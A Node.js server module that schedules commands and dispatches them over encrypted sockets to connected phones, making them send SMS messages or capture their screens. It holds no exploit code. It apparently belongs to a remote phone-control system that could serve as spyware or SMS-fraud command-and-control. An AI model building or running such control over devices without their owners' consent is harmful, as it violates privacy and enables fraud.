/**
 * Scheduled Commands Processor
 * Runs every 30 seconds, picks up pending commands whose scheduled_at <= NOW,
 * executes them (send_sms, screen_capture), and updates their status.
 */

const { encrypt: cryptoEncrypt } = require('./crypto');

let io = null;
let db = null;
let intervalHandle = null;

const POLL_INTERVAL_MS = 30 * 1000; // 30 seconds

function startScheduler(_io, _db) {
  io = _io;
  db = _db;

  if (intervalHandle) clearInterval(intervalHandle);

  intervalHandle = setInterval(processPendingCommands, POLL_INTERVAL_MS);
  console.log('[Scheduler] Started — polling every 30s');
}

function stopScheduler() {
  if (intervalHandle) {
    clearInterval(intervalHandle);
    intervalHandle = null;
  }
}

function processPendingCommands() {
  try {
    const pending = db.prepare(
      "SELECT * FROM scheduled_commands WHERE status = 'pending' AND scheduled_at <= datetime('now')"
    ).all();

    if (pending.length === 0) return;

    console.log(`[Scheduler] Processing ${pending.length} pending command(s)`);

    for (const cmd of pending) {
      try {
        let payload = {};
        try { payload = JSON.parse(cmd.payload || '{}'); } catch (_) {}

        let result = '';
        let status = 'executed';

        switch (cmd.command_type) {
          case 'send_sms':
            result = executeSendSms(cmd.device_id, payload);
            break;

          case 'screen_capture':
            result = executeScreenCapture(cmd.device_id);
            break;

          default:
            result = `Unknown command type: ${cmd.command_type}`;
            status = 'failed';
        }

        db.prepare(
          "UPDATE scheduled_commands SET status = ?, result = ?, executed_at = datetime('now') WHERE id = ?"
        ).run(status, result, cmd.id);

        console.log(`[Scheduler] Command #${cmd.id} (${cmd.command_type}) → ${status}: ${result}`);
      } catch (err) {
        db.prepare(
          "UPDATE scheduled_commands SET status = 'failed', result = ?, executed_at = datetime('now') WHERE id = ?"
        ).run(err.message, cmd.id);
        console.error(`[Scheduler] Command #${cmd.id} failed:`, err.message);
      }
    }

    // Save after processing batch
    if (db.saveNow) db.saveNow();
  } catch (err) {
    console.error('[Scheduler] Poll error:', err.message);
  }
}

/**
 * Execute send_sms command to a connected device
 */
function executeSendSms(deviceId, payload) {
  const { receiver, message, sim_slot } = payload;
  if (!receiver || !message) return 'Missing receiver or message in payload';

  const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
  if (!device || !device.socket_id) return 'Device not connected';

  const targetSocket = io.sockets.sockets.get(device.socket_id);
  if (!targetSocket) return 'Device socket not found (may have disconnected)';

  const requestId = `sched_sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

  targetSocket.emit('send_sms', cryptoEncrypt({
    request_id: requestId,
    receiver,
    message,
    sim_slot: sim_slot || 1,
  }));

  return `Dispatched to device (request_id: ${requestId})`;
}

/**
 * Execute screen_capture command to a connected device
 */
function executeScreenCapture(deviceId) {
  const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
  if (!device || !device.socket_id) return 'Device not connected';

  const targetSocket = io.sockets.sockets.get(device.socket_id);
  if (!targetSocket) return 'Device socket not found (may have disconnected)';

  targetSocket.emit('capture_screen', cryptoEncrypt({ timestamp: new Date().toISOString() }));

  return 'Capture request dispatched to device';
}

module.exports = { startScheduler, stopScheduler };
